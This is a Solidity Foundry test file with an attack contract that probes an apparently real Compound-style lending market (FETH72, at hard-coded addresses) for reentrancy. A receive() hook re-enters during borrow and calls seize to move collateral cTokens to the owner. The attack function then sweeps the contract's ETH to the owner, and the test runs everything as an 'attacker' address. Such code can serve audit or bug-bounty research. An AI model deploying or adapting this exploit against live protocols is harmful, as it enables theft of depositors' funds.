// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function liquidateBorrowAllowed(address cTokenBorrowed, address cTokenCollateral, address liquidator, address borrower, uint256 repayAmount) external returns (uint256);
    function seizeAllowed(address cTokenCollateral, address cTokenBorrowed, address liquidator, address borrower, uint256 seizeTokens) external returns (uint256);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function seize(address liquidator, address borrower, uint256 seizeTokens) external returns (uint256);
    function liquidateBorrow(address borrower) external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function repayBorrow() external payable;
    function approve(address, uint256) external returns (bool);
}

/// @dev Test: Can we call seize during reentrancy?
/// seize transfers cTokens from borrower to liquidator
/// It calls seizeInternal which calls comptroller.seizeAllowed
/// Does seize have a reentrancy guard?
contract SeizeTest {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack() external payable {
        FETH72.mint{value: msg.value}();
        console.log("cTokens:", FETH72.balanceOf(address(this)));

        address[] memory m = new address[](1);
        m[0] = address(FETH72);
        COMPTROLLER.enterMarkets(m);

        borrowInFlight = true;
        uint256 result = FETH72.borrow(1 ether);
        borrowInFlight = false;
        console.log("Borrow:", result);
        console.log("Reentered:", reentered);

        FETH72.repayBorrow{value: 1 ether}();
        FETH72.redeem(FETH72.balanceOf(address(this)));
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;

        console.log("=== REENTRANT - trying seize ===");
        uint256 cTokens = FETH72.balanceOf(address(this));

        // Try calling seize to move cTokens to owner
        // seize(liquidator, borrower, seizeTokens)
        // This would move cTokens from this contract to owner
        try FETH72.seize(owner, address(this), cTokens) returns (uint256 code) {
            console.log("Seize result:", code);
        } catch Error(string memory reason) {
            console.log("Seize failed:", reason);
        } catch {
            console.log("Seize failed (no reason)");
        }
    }
}

contract Pool72Test12 is Test {
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    function testSeizeDuringReentrancy() public {
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 100 ether);

        vm.startPrank(attacker);
        SeizeTest s = new SeizeTest(attacker);
        s.attack{value: 10 ether}();

        console.log("Attacker cTokens:", FETH72.balanceOf(attacker));
        vm.stopPrank();
    }
}
